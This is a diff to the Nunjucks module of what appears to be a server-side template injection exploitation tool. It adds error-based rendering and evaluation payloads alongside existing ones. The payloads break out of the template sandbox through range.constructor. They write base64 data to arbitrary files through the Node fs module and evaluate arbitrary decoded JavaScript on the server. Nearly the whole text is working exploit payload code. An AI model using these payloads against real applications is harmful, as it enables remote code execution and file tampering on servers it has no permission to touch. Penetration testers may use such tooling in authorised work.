@@ -26,6 +26,13 @@ class Nunjucks(javascript.Javascript):
                 'test_render': f'{{{{({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|dump}}}}',
                 'test_render_expected': f'{rand.randints[1]*rand.randints[2]}'
             },
+            'render_error': {
+                'render': '{code}',
+                'header': '''{{{{range.constructor("''['x'][({header[0]}+{header[1]}).toString()+''',
+                'trailer': '''+({trailer[0]}+{trailer[1]}).toString()]")()}}}}''',
+                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
+                'test_render_expected': f'number{rand.randints[1]}'
+            },
             'write': {
                 'call': 'inject',
                 'write': """{{{{range.constructor("global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')")()}}}}""",
@@ -44,6 +51,9 @@ class Nunjucks(javascript.Javascript):
                 'evaluate': """{{{{range.constructor("return eval(Buffer('{code_b64p}','base64').toString())")()}}}}""",
                 'test_os': """global.process.mainModule.require('os').platform()""",
                 'test_os_expected': r'^[\w-]+$',
+            },
+            'evaluate_error': {
+                'evaluate': """eval(Buffer('{code_b64p}','base64').toString())""",
             },
             'execute': {
                 'call': 'evaluate',
